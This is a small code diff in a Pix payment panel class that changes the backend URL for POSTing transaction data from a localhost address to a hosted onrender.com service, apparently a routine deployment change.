@@ -44,7 +44,7 @@ export class PainelPix {
     };
 
     try {
-      const resposta = await fetch('http://localhost:8080/transacoes', {
+      const resposta = await fetch('https://bradesco-sec-java.onrender.com', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(this.dadosOriginais)
